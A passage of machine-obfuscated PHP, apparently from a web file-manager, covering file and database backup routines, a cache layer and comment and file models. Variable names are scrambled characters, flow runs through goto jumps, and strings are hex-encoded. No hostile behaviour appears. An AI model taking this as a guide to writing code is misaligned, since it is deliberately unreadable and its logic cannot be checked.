__construct() { } public function index() { goto DÇá‚Ã§Ú—; DÇá‚Ã§Ú—: $fô±¡⁄≤¿„ =& $_SERVER[—Ω]; $E´¶©êæ¥´ = Backup::get(); $dÑ∂≥Óæç† = $E´¶©êæ¥´[$fô±¡⁄≤¿„[28]]; goto BÇ¿œ€Ø∞ü; b«ñ∞ÿ”ÏŸ: return !0; goto C’ï—íµëˆ; AÇΩã¨˘£∏: $eáå„ŒäˆÁ = new TaskFileTransfer($fô±¡⁄≤¿„[739], $fô±¡⁄≤¿„[722], 0, LNG($fô±¡⁄≤¿„[723]) . $fô±¡⁄≤¿„[408] . LNG($fô±¡⁄≤¿„[725]) . $fô±¡⁄≤¿„[740]); $eáå„ŒäˆÁ->addPath($CÖºΩÛˆº); $D—Ç∫¿‡Éé = IO::infoWithChildren($CÖºΩÛˆº); goto dßÔºÊ¶Íñ; dßÔºÊ¶Íñ: Backup::set(array($fô±¡⁄≤¿„[741] => $D—Ç∫¿‡Éé[$fô±¡⁄≤¿„[77]])); IO::move($CÖºΩÛˆº, $a˘ﬂπ‡∏Ò“); $C¯ ŸãßÚÑ = CONTROLLER_DIR . $fô±¡⁄≤¿„[742]; goto D“Ÿ¡ìãÆÉ; BÇ¿œ€Ø∞ü: $CÖºΩÛˆº = TEMP_FILES . "\x62\141\143\x6b\165\160\137{$dÑ∂≥Óæç†}\x2f"; $a˘ﬂπ‡∏Ò“ = "\173\x69\x6f\72{$E´¶©êæ¥´[$fô±¡⁄≤¿„[701]]}\x7d\57\x64\141\x74\141\x62\141\163\145\57"; IO::mkdir($a˘ﬂπ‡∏Ò“ . "\x62\x61\x63\153\x75\x70\137{$dÑ∂≥Óæç†}\x2f"); goto AÇΩã¨˘£∏; D“Ÿ¡ìãÆÉ: IO::copy($C¯ ŸãßÚÑ, $a˘ﬂπ‡∏Ò“ . "\x62\x61\x63\153\165\x70\x5f{$dÑ∂≥Óæç†}\57"); $eáå„ŒäˆÁ->end(); Backup::set(array($fô±¡⁄≤¿„[743] => $D—Ç∫¿‡Éé[$fô±¡⁄≤¿„[77]])); goto b«ñ∞ÿ”ÏŸ; C’ï—íµëˆ: } } class BackupFile { public function __construct() { } public function index() { goto cäˆ≥ÛöÇü; düç“äñ¥à: $Eû§·§‡∫£ = (int) Model($_SERVER[—Ω][729])->where($CÒ€àéé÷’)->count($_SERVER[—Ω][415]); $aãíïÓ¯ÑÒ = (int) Model($_SERVER[—Ω][729])->where($CÒ€àéé÷’)->sum($_SERVER[—Ω][77]); $a≠ñ÷„ãØ¯ = new TaskFileTransfer($_SERVER[—Ω][746], $_SERVER[—Ω][722], $Eû§·§‡∫£, LNG($_SERVER[—Ω][723]) . $_SERVER[—Ω][724] . LNG($_SERVER[—Ω][747])); goto D©•≤À¬êÁ; B∏âôÀ—·≠: $DìòªâÛÇ‹ = $Dç›Úáù”Õ ? 1 : 0; $D»Ÿﬂ∫ã›ﬂ = array($_SERVER[—Ω][760] => 1, $_SERVER[—Ω][713] => time(), $_SERVER[—Ω][719] => $DìòªâÛÇ‹, $_SERVER[—Ω][757] => $a˘ÀÿãŸäœ, $_SERVER[—Ω][749] => $aãíïÓ¯ÑÒ, $_SERVER[—Ω][748] => $Eû§·§‡∫£); if ($EÇª¡ıπÖ¬) { $D»Ÿﬂ∫ã›ﬂ[$_SERVER[—Ω][758]] = $EÏëººΩıÃ; $D»Ÿﬂ∫ã›ﬂ[$_SERVER[—Ω][759]] = $eëæ§æﬁÎ¢; } goto dì§ﬁÜâÆ√; D©•≤À¬êÁ: $a≠ñ÷„ãØ¯->task[$_SERVER[—Ω][708]] = $aãíïÓ¯ÑÒ; $D»Ÿﬂ∫ã›ﬂ = array($_SERVER[—Ω][748] => $Eû§·§‡∫£, $_SERVER[—Ω][749] => $aãíïÓ¯ÑÒ); Backup::set($D»Ÿﬂ∫ã›ﬂ); goto aÆõ˜ÀÛ‘±; cÌàÈ‚ÜóË: $Eâã£’Éã = 1000; $dÊ—ñû°Æ  = $EÇª¡ıπÖ¬ = 0; $aﬁõ√≤ÙÜ  = array(); goto EØ∑™¨≤§£; dì§ﬁÜâÆ√: Backup::set($D»Ÿﬂ∫ã›ﬂ); $this->_fileFilter($aﬁõ√≤ÙÜ ); return !0; goto EÔ–å◊©‰; cäˆ≥ÛöÇü: $bá¥ó≠∆Éú = Backup::get(); $a˘ÀÿãŸäœ = $bá¥ó≠∆Éú[$_SERVER[—Ω][278]][$_SERVER[—Ω][164]][$_SERVER[—Ω][415]]; $CÒ€àéé÷’ = array($_SERVER[—Ω][416] => array($_SERVER[—Ω][744], $a˘ÀÿãŸäœ), $_SERVER[—Ω][745] => array($_SERVER[—Ω][316], $bá¥ó≠∆Éú[$_SERVER[—Ω][701]])); goto düç“äñ¥à; EØ∑™¨≤§£: $eëæ§æﬁÎ¢ = $EÏëººΩıÃ = 0; do { $bÿ®ñåÉ≥≥ = $_SERVER[—Ω][750]; $dè§ﬂÉäˆÒ = Model($_SERVER[—Ω][729])->where($CÒ€àéé÷’)->field($bÿ®ñåÉ≥≥)->order($_SERVER[—Ω][751])->selectPage($Eâã£’Éã, $AÔâÈÒæÀÁ); $c»ﬂçÏëƒ = !empty($dè§ﬂÉäˆÒ[$_SERVER[—Ω][351]]) ? $dè§ﬂÉäˆÒ[$_SERVER[—Ω][351]] : array(); foreach ($c»ﬂçÏëƒ as $F«¡•ãÊ¿ã) { goto câˆÜ¿≠áù; b÷–˜çÈ∏¨: if (IO::exist($EÔáØÓ©≠)) { $a≠ñ÷„ãØ¯->updateFileEnd($F«¡•ãÊ¿ã[$_SERVER[—Ω][28]], $F«¡•ãÊ¿ã[$_SERVER[—Ω][77]]); } else { $EÔáØÓ©≠ = get_path_father($EÔáØÓ©≠); IO::mkdir($EÔáØÓ©≠); if (!IO::copy($fóº‰·ÖÑ , $EÔáØÓ©≠, $_SERVER[—Ω][754])) { write_log($_SERVER[—Ω][755] . $fóº‰·ÖÑ  . $_SERVER[—Ω][756] . $EÔáØÓ©≠ . $_SERVER[—Ω][472], $_SERVER[—Ω][722]); $Dç›Úáù”Õ = !1; break; } } $a˘ÀÿãŸäœ = $F«¡•ãÊ¿ã[$_SERVER[—Ω][415]]; $EÇª¡ıπÖ¬ += 1; goto cÛìôÕÈ¬å; cÛìôÕÈ¬å: $dÊ—ñû°Æ  += $F«¡•ãÊ¿ã[$_SERVER[—Ω][77]]; $EÏëººΩıÃ += 1; $eëæ§æﬁÎ¢ += $F«¡•ãÊ¿ã[$_SERVER[—Ω][77]]; goto dÂ”ΩÒá≈”; câˆÜ¿≠áù: if (!$this->_fileExist($F«¡•ãÊ¿ã, $aﬁõ√≤ÙÜ , $eü¥¯úÑÚ«)) { $Eû§·§‡∫£ -= 1; $aãíïÓ¯ÑÒ -= (int) $F«¡•ãÊ¿ã[$_SERVER[—Ω][77]]; write_log("\146\151\154\145\40\156\157\x74\40\x65\170\x69\x73\x74\56\146\151\154\145\x49\x44\72{$F«¡•ãÊ¿ã[$_SERVER[—Ω][415]]}\54\x20\x70\x61\164\150\72{$F«¡•ãÊ¿ã[$_SERVER[—Ω][75]]}", $_SERVER[—Ω][752]); continue; } $fóº‰·ÖÑ  = $F«¡•ãÊ¿ã[$_SERVER[—Ω][75]]; $EÔáØÓ©≠ = "\x7b\151\x6f\x3a{$bá¥ó≠∆Éú[$_SERVER[—Ω][701]]}\x7d" . substr($fóº‰·ÖÑ , strlen("\173\151\x6f\72{$F«¡•ãÊ¿ã[$_SERVER[—Ω][753]]}\175")); goto b÷–˜çÈ∏¨; dÂ”ΩÒá≈”: if ($dÊ—ñû°Æ  >= 1024 * 1024 * 100) { $D»Ÿﬂ∫ã›ﬂ = array($_SERVER[—Ω][757] => $a˘ÀÿãŸäœ, $_SERVER[—Ω][758] => $EÏëººΩıÃ, $_SERVER[—Ω][759] => $eëæ§æﬁÎ¢); Backup::set($D»Ÿﬂ∫ã›ﬂ); $dÊ—ñû°Æ  = $EÇª¡ıπÖ¬ = 0; } goto e¯ø–úñ†; e¯ø–úñ†: } $B•◊Û∫µÑï = count($c»ﬂçÏëƒ); $AÔâÈÒæÀÁ++; } while ($B•◊Û∫µÑï == $Eâã£’Éã); $a≠ñ÷„ãØ¯->end(); goto B∏âôÀ—·≠; aÆõ˜ÀÛ‘±: $Dç›Úáù”Õ = !0; $eü¥¯úÑÚ« = $this->storeIds(); $AÔâÈÒæÀÁ = 1; goto cÌàÈ‚ÜóË; EÔ–å◊©‰: } private function _fileExist($Eø∂õﬁ©Áì, &$Fà¬ä¶∞‚È, $aÆÌ”‹Í¢‘) { goto dÜáƒÚÎÎ´; Eâ∏ÜµÙ÷Í: if (IO::exist($e≈í¥Ú«Á™)) { $Fà¬ä¶∞‚È[] = $Eø∂õﬁ©Áì[$cﬁŸŒÉò¬ö[415]]; return !1; } $F»∞‰ÇŒëã = array($cﬁŸŒÉò¬ö[753] => $Eø∂õﬁ©Áì[$cﬁŸŒÉò¬ö[753]], $cﬁŸŒÉò¬ö[75] => array($cﬁŸŒÉò¬ö[761], "{$e≈í¥Ú«Á™}\45")); $aﬂ¡—Àòûá = Model($cﬁŸŒÉò¬ö[729])->where($F»∞‰ÇŒëã)->field($cﬁŸŒÉò¬ö[416])->select(); goto aÜä≥àŸáÃ; dÜáƒÚÎÎ´: $cﬁŸŒÉò¬ö =& $_SERVER[—Ω]; $Eœ”á…åïÃ = $Eø∂õﬁ©Áì[$cﬁŸŒÉò¬ö[75]]; if (in_array($Eø∂õﬁ©Áì[$cﬁŸŒÉò¬ö[415]], $Fà¬ä¶∞‚È)) { return !1; } goto c¨úÒÚÆÇË; c¨úÒÚÆÇË: if (!in_array($Eø∂õﬁ©Áì[$cﬁŸŒÉò¬ö[753]], $aÆÌ”‹Í¢‘)) { return !1; } if (IO::exist($Eœ”á…åïÃ)) { return !0; } $e≈í¥Ú«Á™ = get_path_father($Eœ”á…åïÃ); goto Eâ∏ÜµÙ÷Í; aÜä≥àŸáÃ: $Fà¬ä¶∞‚È = array_merge($Fà¬ä¶∞‚È, array_to_keyvalue($aﬂ¡—Àòûá, $cﬁŸŒÉò¬ö[33], $cﬁŸŒÉò¬ö[415])); return !1; goto fÎ¬„Ï”πë; fÎ¬„Ï”πë: } private function _fileFilter($eÍü√¬≤Éã) { $DÛÃÕã¯˜› =& $_SERVER[—Ω]; if (empty($eÍü√¬≤Éã)) { return; } $DËÛÚÒâæØ = array($DÛÃÕã¯˜›[415] => array($DÛÃÕã¯˜›[7], array_unique($eÍü√¬≤Éã))); $a¡ß∞È©Ç˘ = Model($DÛÃÕã¯˜›[762])->where($DËÛÚÒâæØ)->field($DÛÃÕã¯˜›[366])->select(); foreach ($a¡ß∞È©Ç˘ as $eÇì˘Ì©«í) { Model($DÛÃÕã¯˜›[762])->remove($eÇì˘Ì©«í[$DÛÃÕã¯˜›[366]], !1); } } private function storeIds() { $b∆˘÷Õ‰Œß =& $_SERVER[—Ω]; $b≈Áâª«´º = Model($b∆˘÷Õ‰Œß[714])->listData(); return array_to_keyvalue($b≈Áâª«´º, $b∆˘÷Õ‰Œß[33], $b∆˘÷Õ‰Œß[364]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto E€Úë∏Òæá; B∞üõ∂õ∆: switch ($Cà◊Œã®£ˆ[$fõ´Í≥úú€[763]]) { case $fõ´Í≥úú€[17]: self::$handle = Model($fõ´Í≥úú€[765]); break; case $fõ´Í≥úú€[766]: self::$handle = new CacheRedis($a»±ÈæÉí±, $E—ùÉÎä°ç); break; case $fõ´Í≥úú€[767]: self::$handle = new CacheMemcached($a»±ÈæÉí±, $E—ùÉÎä°ç); break; case $fõ´Í≥úú€[164]: self::$handle = new CacheFile($a»±ÈæÉí±, $E—ùÉÎä°ç); break; default: break; } return self::$handle; goto bÕ‰±Ω∑∏Ù; E€Úë∏Òæá: $fõ´Í≥úú€ =& $_SERVER[—Ω]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto eí◊ö“¿§; eí◊ö“¿§: $Cà◊Œã®£ˆ = $GLOBALS[$fõ´Í≥úú€[6]][$fõ´Í≥úú€[334]]; $a»±ÈæÉí± = $Cà◊Œã®£ˆ[$Cà◊Œã®£ˆ[$fõ´Í≥úú€[763]]]; $E—ùÉÎä°ç = $Cà◊Œã®£ˆ[$fõ´Í≥úú€[764]]; goto B∞üõ∂õ∆; bÕ‰±Ω∑∏Ù: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($dõ”É ‡õπ) { if (is_array($dõ”É ‡õπ) || is_object($dõ”É ‡õπ)) { $dõ”É ‡õπ = json_encode($dõ”É ‡õπ); } $dõ”É ‡õπ = rawurlencode($dõ”É ‡õπ); return KOD_SITE_ID . $_SERVER[—Ω][70] . $dõ”É ‡õπ; } public static function get($BÖö¿∂ú˘Æ) { $DΩîö—›Ú• = self::key($BÖö¿∂ú˘Æ); if (!isset(self::$memoryCache[$DΩîö—›Ú•])) { CacheLock::lock($BÖö¿∂ú˘Æ); $eÆÃÖÁ´»à = self::init()->get($DΩîö—›Ú•); CacheLock::unlock($BÖö¿∂ú˘Æ); self::$memoryCache[$DΩîö—›Ú•] = unserialize($eÆÃÖÁ´»à); } return self::$memoryCache[$DΩîö—›Ú•]; } public static function set($aÕÊœ£ﬂˆ, $açÉ´ˆ‘Ì‹, $b“˘•≠ﬁ®› = false) { goto DÖ∂›Ã™¨“; DÖ∂›Ã™¨“: $E¯‰π©èÓ© = self::key($aÕÊœ£ﬂˆ); if (isset(self::$memoryCache[$E¯‰π©èÓ©]) && self::$memoryCache[$E¯‰π©èÓ©] === $açÉ´ˆ‘Ì‹) { return !0; } if ($b“˘•≠ﬁ®› === 0) { self::$memoryCache[$E¯‰π©èÓ©] = $açÉ´ˆ‘Ì‹; return !0; } goto Fä≈•ÆÒèµ; Fä≈•ÆÒèµ: CacheLock::lock($aÕÊœ£ﬂˆ); $bêÖ©ÆÍÿÿ = self::init()->set($E¯‰π©èÓ©, serialize($açÉ´ˆ‘Ì‹), $b“˘•≠ﬁ®›); self::$memoryCache[$E¯‰π©èÓ©] = $açÉ´ˆ‘Ì‹; goto f£÷úıØÁ„; f£÷úıØÁ„: CacheLock::unlock($aÕÊœ£ﬂˆ); return $bêÖ©ÆÍÿÿ; goto C∏≤Â©Ö¥ó; C∏≤Â©Ö¥ó: } public static function remove($c‰üù≥É¢¿) { goto a§¡Õ€Áë·; eá¯êﬂŒç¶: return $c◊‡òøíùî; goto E†≠Ù ±¬∫; a§¡Õ€Áë·: $Fﬁïõ≈Ùê» = self::key($c‰üù≥É¢¿); unset(self::$memoryCache[$Fﬁïõ≈Ùê»]); self::clearTimeout(); goto aÈ…ÌâåÆ; aÈ…ÌâåÆ: CacheLock::lock($c‰üù≥É¢¿); $c◊‡òøíùî = self::init()->remove($Fﬁïõ≈Ùê»); CacheLock::unlock($c‰üù≥É¢¿); goto eá¯êﬂŒç¶; E†≠Ù ±¬∫: } public static function clearMemory($DﬂîÉ®ì±é = false) { if ($DﬂîÉ®ì±é) { $DﬂîÉ®ì±é = self::key($DﬂîÉ®ì±é); unset(self::$memoryCache[$DﬂîÉ®ì±é]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[—Ω][768])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[—Ω][769])) { self::init()->clearTimeout(); } } } goto bˆÓÕ›øõ«; aî‚ë®ùóî: define($_SERVER[—Ω][224], 2); define($_SERVER[—Ω][225], 3); define($_SERVER[—Ω][226], 1); goto f„‘à»˜û¢; DêÜéÁñÁá: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\x65\x6e\x74"; protected $tableMeta = array("\164\141\x62\154\145\x4e\x61\x6d\x65" => "\143\157\x6d\155\x65\156\164\x5f\x6d\x65\x74\141", "\x6d\145\x74\x61\x46\151\x65\x6c\x64" => "\x63\x6f\x6d\x6d\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($E„Ì¿Í÷–à) { $DÕÛ∞Íèˆú =& $_SERVER[—Ω]; if ($E„Ì¿Í÷–à[$DÕÛ∞Íèˆú[2107]]) { $a•∫£ßÇ≥… = $this->where(array($DÕÛ∞Íèˆú[2108] => $E„Ì¿Í÷–à[$DÕÛ∞Íèˆú[2107]]))->find(); if (!$a•∫£ßÇ≥… || $a•∫£ßÇ≥…[$DÕÛ∞Íèˆú[368]] != $E„Ì¿Í÷–à[$DÕÛ∞Íèˆú[368]] || $a•∫£ßÇ≥…[$DÕÛ∞Íèˆú[452]] != $E„Ì¿Í÷–à[$DÕÛ∞Íèˆú[452]]) { return !1; } $this->where(array($DÕÛ∞Íèˆú[2108] => $E„Ì¿Í÷–à[$DÕÛ∞Íèˆú[2107]]))->setAdd($DÕÛ∞Íèˆú[2109], 1); } return $this->add($E„Ì¿Í÷–à); } public function remove($C∫¨Ã»À”√) { $c«óÍîåÜ§ =& $_SERVER[—Ω]; $eùúøèèﬂ⁄ = array($c«óÍîåÜ§[2108] => $C∫¨Ã»À”√); $eâÔ‘ëñöÉ = $this->where($eùúøèèﬂ⁄)->find(); if ($eâÔ‘ëñöÉ[$c«óÍîåÜ§[2107]]) { $this->where(array($c«óÍîåÜ§[2108] => $eâÔ‘ëñöÉ[$c«óÍîåÜ§[2107]]))->setAdd($c«óÍîåÜ§[2109], -1); } return $this->where($eùúøèèﬂ⁄)->delete(); } public function edit($c∑•ôå≈û®, $eÕÒ¡≥òæ®) { $EöôáŒõ¡ =& $_SERVER[—Ω]; $CƒíÑéÜÊ∫ = array($EöôáŒõ¡[2108] => $c∑•ôå≈û®); return $this->where($CƒíÑéÜÊ∫)->save(array($EöôáŒõ¡[2110] => $eÕÒ¡≥òæ®)); } public function prasise($A¨õ·ëÀÀÊ) { $e¡ê´¨£ﬁî =& $_SERVER[—Ω]; $bãæƒÃÚÉ∏ = Model($e¡ê´¨£ﬁî[2111]); $DëÀÖ€œ‘ç = array($e¡ê´¨£ﬁî[2108] => $A¨õ·ëÀÀÊ, $e¡ê´¨£ﬁî[1408] => USER_ID); $F†›∞åÈ—Ù = $bãæƒÃÚÉ∏->where($DëÀÖ€œ‘ç)->find(); if (!$F†›∞åÈ—Ù) { $bãæƒÃÚÉ∏->add($DëÀÖ€œ‘ç); $EÜì‘–ØÚ© = $this->where(array($e¡ê´¨£ﬁî[2108] => $A¨õ·ëÀÀÊ))->setAdd($e¡ê´¨£ﬁî[2112], 1); } else { $bãæƒÃÚÉ∏->where($DëÀÖ€œ‘ç)->delete(); $EÜì‘–ØÚ© = $this->where(array($e¡ê´¨£ﬁî[2108] => $A¨õ·ëÀÀÊ))->setAdd($e¡ê´¨£ﬁî[2112], -1); } return $EÜì‘–ØÚ©; } public function targetInfo($A»æêéÒŸ‚, $bäÒ¶ñ‚Î°) { goto bá∑’ªÀø‹; b »»™¯Úﬁ: $CÇãñ≠˜äÇ = "\x52\111\x47\x48\124\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\x63\157\155\155\145\156\164\137\160\x72\141\x69\x73\x65\x20\x73\164\x61\162\x20\x6f\x6e\x20\x63\x6f\155\x6d\x65\156\164\x2e\x63\157\155\x6d\x65\x6e\x74\x49\x44\x20\x3d\40\x73\164\141\162\56\143\x6f\155\155\145\156\164\111\104"; $e€“’·—øÍ = $this->alias($DÌªàÇ±Æ„[338])->where($A⁄¶Óú«Ë€)->join($CÇãñ≠˜äÇ, $DÌªàÇ±Æ„[2113])->count(); $aãÕëÜÕ®î = array($DÌªàÇ±Æ„[2114] => $EìΩæ∫≥Øﬁ, $DÌªàÇ±Æ„[2115] => $e€“’·—øÍ); goto D¨ãÃüùÏ¬; D¨ãÃüùÏ¬: return $aãÕëÜÕ®î; goto cÏœÑ”Ö—Â; bá∑’ªÀø‹: $DÌªàÇ±Æ„ =& $_SERVER[—Ω]; $A⁄¶Óú«Ë€ = array($DÌªàÇ±Æ„[517] => $A»æêéÒŸ‚, $DÌªàÇ±Æ„[518] => $bäÒ¶ñ‚Î°); $EìΩæ∫≥Øﬁ = $this->where($A⁄¶Óú«Ë€)->count(); goto b »»™¯Úﬁ; cÏœÑ”Ö—Â: } public function listData($BûÉÿƒÇ´Ô) { $cŸ±÷Ì“è… =& $_SERVER[—Ω]; if (isset($BûÉÿƒÇ´Ô[$cŸ±÷Ì“è…[2116]])) { if ($BûÉÿƒÇ´Ô[$cŸ±÷Ì“è…[2116]]) { $BûÉÿƒÇ´Ô[$cŸ±÷Ì“è…[2117]] = array($cŸ±÷Ì“è…[934], intval($BûÉÿƒÇ´Ô[$cŸ±÷Ì“è…[2116]])); } unset($BûÉÿƒÇ´Ô[$cŸ±÷Ì“è…[2116]]); } if (isset($BûÉÿƒÇ´Ô[$cŸ±÷Ì“è…[2118]])) { if ($BûÉÿƒÇ´Ô[$cŸ±÷Ì“è…[2118]]) { $BûÉÿƒÇ´Ô[$cŸ±÷Ì“è…[2117]] = array($cŸ±÷Ì“è…[931], intval($BûÉÿƒÇ´Ô[$cŸ±÷Ì“è…[2118]])); } unset($BûÉÿƒÇ´Ô[$cŸ±÷Ì“è…[2118]]); } return $this->_listData($BûÉÿƒÇ´Ô); } private function _listData($A®◊„ ÁûÈ) { $a¨Ë·Êó¿‹ =& $_SERVER[—Ω]; $dÙªÉÇ∏ÂŒ = $this->where($A®◊„ ÁûÈ)->_makeOrder()->selectPage(100); $this->_listAppendParent($dÙªÉÇ∏ÂŒ[$a¨Ë·Êó¿‹[351]]); $this->_listAppendUser($dÙªÉÇ∏ÂŒ[$a¨Ë·Êó¿‹[351]]); $this->_listAppendMeta($dÙªÉÇ∏ÂŒ[$a¨Ë·Êó¿‹[351]]); return $dÙªÉÇ∏ÂŒ; } private function _makeOrder() { $e‘øüµ•ÿ∫ =& $_SERVER[—Ω]; $cÛ‰˘ÔíàË = array($e‘øüµ•ÿ∫[2112], $e‘øüµ•ÿ∫[2109], $e‘øüµ•ÿ∫[184]); $Fß·ôÖÍﬁø = Input::get($e‘øüµ•ÿ∫[403], $e‘øüµ•ÿ∫[7], $e‘øüµ•ÿ∫[386], $cÛ‰˘ÔíàË); $aäÏ†æ‚’‡ = Input::get($e‘øüµ•ÿ∫[404], $e‘øüµ•ÿ∫[7], $e‘øüµ•ÿ∫[1410], array($e‘øüµ•ÿ∫[2119], $e‘øüµ•ÿ∫[401])); $A°î°´ÕóÊ = $Fß·ôÖÍﬁø . $e‘øüµ•ÿ∫[50] . $aäÏ†æ‚’‡; return $this->order($A°î°´ÕóÊ); } private function _listAppendParent(&$AﬂÀ±Â∆“´) { goto C∑Ú’ƒàÓç; C∑Ú’ƒàÓç: $e‚ô∞‡ﬂ»µ =& $_SERVER[—Ω]; $Aåã‰ƒ„ûÇ = array_unique(array_to_keyvalue($AﬂÀ±Â∆“´, $e‚ô∞‡ﬂ»µ[33], $e‚ô∞‡ﬂ»µ[2107])); $Aåã‰ƒ„ûÇ = array_remove_value($Aåã‰ƒ„ûÇ, $e‚ô∞‡ﬂ»µ[464]); goto Cıè≤ÇåﬁË; BË¶ñô° ”: foreach ($AﬂÀ±Â∆“´ as &$CﬂÉß¨˘˘é) { if (isset($aã—Éå’‘à[$CﬂÉß¨˘˘é[$e‚ô∞‡ﬂ»µ[2107]]])) { $CﬂÉß¨˘˘é[$e‚ô∞‡ﬂ»µ[2120]] = $aã—Éå’‘à[$CﬂÉß¨˘˘é[$e‚ô∞‡ﬂ»µ[2107]]]; } } goto Aß∞†›îø≤; Cıè≤ÇåﬁË: if (!$Aåã‰ƒ„ûÇ) { return; } $aã—Éå’‘à = $this->where(array($e‚ô∞‡ﬂ»µ[2108] => array($e‚ô∞‡ﬂ»µ[7], $Aåã‰ƒ„ûÇ)))->select(); $aã—Éå’‘à = array_to_keyvalue($aã—Éå’‘à, $e‚ô∞‡ﬂ»µ[2117]); goto BË¶ñô° ”; Aß∞†›îø≤: } private function _listAppendUser(&$f¿ê±ì¢ã∞) { goto CÖ√úËî¿‡; bÎÇÆ‚‚û¥: if (count($aÖ∑â‰†≠®) == 0) { return; } foreach ($f¿ê±ì¢ã∞ as $bÀΩ÷‡∆ëõ) { if (isset($bÀΩ÷‡∆ëõ[$b°£Ñ§∑í[2120]])) { $aÖ∑â‰†≠®[] = $bÀΩ÷‡∆ëõ[$b°£Ñ§∑í[2120]][$b°£Ñ§∑í[1417]]; } } $bâÖ „ΩÆÒ = Model($b°£Ñ§∑í[473])->userListInfo($aÖ∑â‰†≠®); goto e◊æÛÃÌ£Ü; e◊æÛÃÌ£Ü: foreach ($f¿ê±ì¢ã∞ as &$bÀΩ÷‡∆ëõ) { $bÀΩ÷‡∆ëõ[$b°£Ñ§∑í[531]] = $bâÖ „ΩÆÒ[$bÀΩ÷‡∆ëõ[$b°£Ñ§∑í[1417]]]; if (isset($bÀΩ÷‡∆ëõ[$b°£Ñ§∑í[2120]])) { $bÀΩ÷‡∆ëõ[$b°£Ñ§∑í[2120]][$b°£Ñ§∑í[531]] = $bâÖ „ΩÆÒ[$bÀΩ÷‡∆ëõ[$b°£Ñ§∑í[2120]][$b°£Ñ§∑í[1417]]]; } } goto Bﬁ‚◊Â∂—ø; CÖ√úËî¿‡: $b°£Ñ§∑í =& $_SERVER[—Ω]; $aÖ∑â‰†≠® = array_unique(array_to_keyvalue($f¿ê±ì¢ã∞, $b°£Ñ§∑í[33], $b°£Ñ§∑í[1417])); $aÖ∑â‰†≠® = array_remove_value($aÖ∑â‰†≠®, $b°£Ñ§∑í[464]); goto bÎÇÆ‚‚û¥; Bﬁ‚◊Â∂—ø: } private function _listAppendMeta(&$FŸ§üÿáŒç) { goto FﬁÇÔ∞–ºÏ; D∂æãæÙÕ˘: if (!$Aﬂú‹˜âéà) { return; } foreach ($FŸ§üÿáŒç as $e¡â¡¥¡å¬) { if (isset($e¡â¡¥¡å¬[$e÷Êå∂î‰›[2120]])) { $Aﬂú‹˜âéà[] = $e¡â¡¥¡å¬[$e÷Êå∂î‰›[2120]][$e÷Êå∂î‰›[2117]]; } } $eª◊†ÁÎ“Ì = $this->metaList($Aﬂú‹˜âéà); goto Cé‹˜¶Ã£…; Cé‹˜¶Ã£…: if (!$eª◊†ÁÎ“Ì) { return !1; } foreach ($FŸ§üÿáŒç as &$e¡â¡¥¡å¬) { $e¡â¡¥¡å¬[$e÷Êå∂î‰›[413]] = $eª◊†ÁÎ“Ì[$e¡â¡¥¡å¬[$e÷Êå∂î‰›[2117]]]; if (isset($e¡â¡¥¡å¬[$e÷Êå∂î‰›[2120]])) { $e¡â¡¥¡å¬[$e÷Êå∂î‰›[2120]][$e÷Êå∂î‰›[413]] = $eª◊†ÁÎ“Ì[$e¡â¡¥¡å¬[$e÷Êå∂î‰›[2120]][$e÷Êå∂î‰›[2117]]]; } } goto B∑œàÚÒ¶ﬂ; FﬁÇÔ∞–ºÏ: $e÷Êå∂î‰› =& $_SERVER[—Ω]; $Aﬂú‹˜âéà = array_unique(array_to_keyvalue($FŸ§üÿáŒç, $e÷Êå∂î‰›[33], $e÷Êå∂î‰›[2117])); $Aﬂú‹˜âéà = array_remove_value($Aﬂú‹˜âéà, $e÷Êå∂î‰›[464]); goto D∂æãæÙÕ˘; B∑œàÚÒ¶ﬂ: } private function metaList($f≠…çá∏¯—) { goto e‘√∞œßûı; E—¢ ÖÏç¬: $A¯≤ˆ¨øÇè = Model($D˘¢¥€∏Õı[2121])->where($Bˆ¨Ü¡µÁï)->select(); $A¯≤ˆ¨øÇè = array_to_keyvalue_group($A¯≤ˆ¨øÇè, $D˘¢¥€∏Õı[2117]); foreach ($A¯≤ˆ¨øÇè as $Eõ…ÖŒì‡≤ => $DãÒ®˜≈åø) { $Cî‹„î§•… = array(); foreach ($DãÒ®˜≈åø as $f≤‹π∏“îâ) { $Cî‹„î§•…[$f≤‹π∏“îâ[$D˘¢¥€∏Õı[89]]] = $f≤‹π∏“îâ[$D˘¢¥€∏Õı[356]]; } $A¯≤ˆ¨øÇè[$Eõ…ÖŒì‡≤] = $Cî‹„î§•…; } goto D¨ƒÇÙÂáÆ; D¨ƒÇÙÂáÆ: return $A¯≤ˆ¨øÇè ? $A¯≤ˆ¨øÇè : array(); goto AÑ¥ﬁ…óûß; e‘√∞œßûı: $D˘¢¥€∏Õı =& $_SERVER[—Ω]; if (!$f≠…çá∏¯—) { return array(); } $Bˆ¨Ü¡µÁï = array($D˘¢¥€∏Õı[2117] => array($D˘¢¥€∏Õı[7], $f≠…çá∏¯—)); goto E—¢ ÖÏç¬; AÑ¥ﬁ…óûß: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\154\x65"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\x61\155\145" => "\151\157\137\146\151\154\x65\137\x6d\x65\164\141", "\155\x65\164\x61\106\151\145\x6c\144" => "\146\151\x6c\145\x49\104"); public function fileInfo($fËÈÁøôÕ‘) { $EõÇ¢Ê®„§ =& $_SERVER[—Ω]; static $fÎ—∞«“ùØ = array(); if (!isset($fÎ—∞«“ùØ[$fËÈÁøôÕ‘])) { $c´∫¿âãî∂ = $EõÇ¢Ê®„§[2122]; $e›◊ù€Ωº— = Model($EõÇ¢Ê®„§[418])->field($c´∫¿âãî∂)->where(array($EõÇ¢Ê®„§[416] => $fËÈÁøôÕ‘))->find(); $fÎ—∞«“ùØ[$fËÈÁøôÕ‘] = $e›◊ù€Ωº—; } return 